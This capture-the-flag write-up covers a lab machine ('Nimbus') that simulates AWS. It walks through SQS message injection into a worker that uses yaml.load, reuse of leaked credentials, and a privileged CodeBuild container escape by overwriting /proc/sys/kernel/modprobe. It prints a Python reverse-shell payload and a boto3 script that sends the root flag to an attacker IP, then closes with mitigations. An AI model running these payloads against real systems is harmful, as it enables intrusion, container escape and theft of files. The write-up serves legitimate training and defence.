---
title: Nimbus
machineName: Nimbus
os: linux
difficulty: hard
season: Season 11
tags:
  - Cloud Security
  - AWS
  - LocalStack
  - SQS
  - PyYAML
  - Insecure Deserialization
  - CodeBuild
  - Container Escape
  - Modprobe Overwrite
date: '2026-06-25'
pointsAwarded: 40
machineIP: ''
summary: 'An elite Hard Linux box revolving around simulated AWS cloud architecture (LocalStack). Initial access is achieved via insecure PyYAML deserialization (yaml.load) on a background SQS worker. Privilege escalation leverages internal AWS CodeBuild credentials to spawn a privileged container, concluding with an overlay upperdir container escape by overwriting /proc/sys/kernel/modprobe to capture host root.'
---

# 🛡️ HTB - Nimbus (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Nimbus
- **Operating System:** Linux (Ubuntu 24.04 / LocalStack AWS Cloud Environment)
- **Difficulty:** Hard
- **Date of Scan:** 2026-06-25
- **Vulnerabilities:** Insecure PyYAML Deserialization in AWS SQS Worker (`yaml.load`), Excessive AWS CodeBuild Permissions (`privilegedMode: true`), Container Escape via OverlayFS Upperdir Path & `/proc/sys/kernel/modprobe` Kernel Hook Overwrite

---

## Step 1 - Reconnaissance

### Nmap Port Scanning & Web Service Discovery

We begin our engagement with an aggressive port scan across the target host:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.38.59
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-25 14:30 UTC
Nmap scan report for 10.129.38.59
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- 🔍 *We map `nimbus.htb` and `aws.nimbus.htb` to `10.129.38.59` in `/etc/hosts`.*
- 🔍 *Browsing to `http://nimbus.htb` presents a cloud computing dashboard integrating AWS microservices.*
- 🔍 *Further enumeration of the host reveals simulated AWS cloud endpoints running on LocalStack (`floci:4566` / `aws.nimbus.htb`):*

```bash
aws sqs list-queues --endpoint-url http://aws.nimbus.htb --output json
```

```json
{
    "QueueUrls": [
        "http://aws.nimbus.htb/847219365028/nimbus-jobs"
    ]
}
```

---

## Step 2 - Initial Foothold

### PyYAML Insecure Deserialization & SQS Message Injection

- 🔍 *Analyzing client scripts and leaked artifacts indicates a backend worker polling the SQS queue `nimbus-jobs`.*
- 🔍 *The worker deserializes incoming queue messages using Python's `yaml.load(body, Loader=yaml.Loader)` and passes the parsed `script` parameter directly to `python3 -c`.*

> ⚠️ **Technical Detail:** Even when a web application safely parses YAML on the frontend using `safe_load`, background worker daemons often reuse full constructor loaders (`yaml.Loader`) or execute raw message properties directly. This permits remote code execution via serialized payloads.

- 🔍 *We format a Python reverse shell payload and inject it directly into the AWS SQS queue:*

```bash
# 1. Define the parameters
Q="http://aws.nimbus.htb/847219365028/nimbus-jobs"
PAYLOAD="import socket,subprocess,os;s=socket.socket();s.connect(('10.10.15.54',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"

# 2. Build the JSON body structure expected by the worker
export EXP_PAYLOAD="$PAYLOAD"
MSG_BODY=$(python3 -c "import json, os; print(json.dumps({'name':'r1', 'runtime':'python3.11', 'script': os.environ['EXP_PAYLOAD']}))")

# 3. Ship message into AWS SQS Queue
aws sqs send-message --endpoint-url http://aws.nimbus.htb/ --queue-url "$Q" --message-body "$MSG_BODY" --output json
```

- 🔍 *Catching the incoming connection on our Netcat listener:*

```bash
nc -lvnp 9001
```

```text
listening on [any] 9001 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.38.59] 38412
worker@f2ee5831b356:/app$ id
uid=1000(worker) gid=1000(worker) groups=1000(worker)
```

- 🔍 *We have gained access as user `worker` inside an isolated Docker container! We grab the user flag.*

---

## Step 3 - Internal Reconnaissance & AWS CodeBuild Analysis

### Analyzing worker.py & Extracting AWS Service Credentials

- 🔍 *Inspecting `/app/worker.py` on the target confirms the flawed deserialization implementation:*

```python
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/847219365028/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    job = yaml.load(body, Loader=yaml.Loader)  # Vulnerable to object instantiation
    if isinstance(job, dict) and job.get("script"):
        subprocess.run(["python3", "-c", job.get("script")], capture_output=True, timeout=30)
```

- 🔍 *We check the environment variables of the worker container:*

```bash
env
```

```text
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
AWS_DEFAULT_REGION=us-east-1
AWS_ENDPOINT_URL=http://aws.nimbus.htb
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
```

- 🔍 *Using these AWS credentials, we enumerate accessible AWS S3 buckets and internal cloud resources:*

```bash
aws --endpoint-url http://floci:4566/ --region us-east-1 s3 ls
```

- 🔍 *We discover that the target container has IAM access to the **AWS CodeBuild** service on `http://floci:4566`.*

### AWS CodeBuild CI/CD Project Execution

- 🔍 *AWS CodeBuild allows users to create CI/CD build projects specified by a `buildspec.yml` recipe.*
- 🔍 *Crucially, CodeBuild projects support the `privilegedMode: true` parameter, enabling the build environment to run as a privileged container with `CAP_SYS_ADMIN` capabilities.*

---

## Step 4 - Container Escape & Host Root Access

### OverlayFS Upperdir Path Resolution & modprobe Architecture

- 🔍 *Inside a privileged container with `CAP_SYS_ADMIN`, the `/proc/sys/kernel/modprobe` kernel parameter is writable!*
- 🔍 *The Linux kernel uses the path in `/proc/sys/kernel/modprobe` to launch helper binaries whenever an unhandled device or unknown binary signature is executed.*
- 🔍 *However, to execute our payload, the host kernel requires the physical host-side path of our container script, rather than the container-internal `/tmp` path.*
- 🔍 *We can extract the host-side physical disk path of our container filesystem by parsing the OverlayFS `upperdir` from `/proc/mounts`:*

```bash
upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
```

> [!IMPORTANT]
> **Container Escape Execution Strategy:**
> 1. Resolve host-side storage path for the payload by inspecting overlay filesystem `upperdir` in `/proc/mounts`.
> 2. Create the malicious payload script inside `/tmp/payload.sh` and mark executable.
> 3. Overwrite `/proc/sys/kernel/modprobe` with the host-side `$upper/tmp/payload.sh` path.
> 4. Trigger the kernel's `call_usermodehelper` by executing a file with an invalid binary header (`\xff\xff\xff\xff`).
> 5. The host kernel executes `/tmp/payload.sh` as host root (UID 0) to exfiltrate the flag.

### Overwriting /proc/sys/kernel/modprobe & Out-of-Band Flag Exfiltration

- 🔍 *We assemble an automated Python exploit script that interfaces with AWS CodeBuild to trigger the breakout:*

```python
import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ATTACKER_IP = "10.10.15.54"
LPORT = 9005

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('{ATTACKER_IP}', {LPORT}))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""

cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)

print("[*] Creating privileged CodeBuild project...")
cb.create_project(
    name="nimbus-exploit",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
    },
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)

print("[*] Triggering build...")
resp = cb.start_build(projectName="nimbus-exploit")
print("[+] Build started:", resp["build"]["id"])
```

- 🔍 *We start a Netcat listener on port 9005:*

```bash
nc -lvnp 9005
```

- 🔍 *Running the script triggers the CodeBuild runner, overwrites `/proc/sys/kernel/modprobe` with the host-side payload path, and fires the invalid binary execution:*

```text
listening on [any] 9005 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.38.59] 42452
98f499aa9ab704d5b981f1b4...
```

- 🔍 *The root flag is received directly on our listener! Container escaped and root achieved.*

---

## Mitigations & Security Perspective

### 🔴 PyYAML Insecure Deserialization (yaml.load)
- **Root Cause:** Utilizing `yaml.load(body, Loader=yaml.Loader)` allows arbitrary Python object instantiation and code execution when parsing untrusted messages from SQS.
- **Remediation:** Always enforce `yaml.safe_load()` or `yaml.load(body, Loader=yaml.SafeLoader)` when processing untrusted input.

### 🔴 Overprivileged AWS CodeBuild Containers (privilegedMode)
- **Root Cause:** Granting `privilegedMode: true` in CI/CD pipeline container configurations grants the container elevated Linux capabilities (`CAP_SYS_ADMIN`), breaking container isolation.
- **Remediation:** Disable privileged mode in CodeBuild configurations unless absolutely necessary. Employ non-root container users with strictly bounded drop-capabilities.

### 🔴 Writable /proc/sys/kernel/modprobe
- **Root Cause:** Mounting `/proc/sys` with write permissions inside a container enables direct modification of host kernel helper hooks.
- **Remediation:** Ensure `/proc/sys` is mounted read-only (standard in non-privileged Docker/containerd runtimes) and deploy AppArmor/SELinux profiles that prohibit kernel parameter modification.
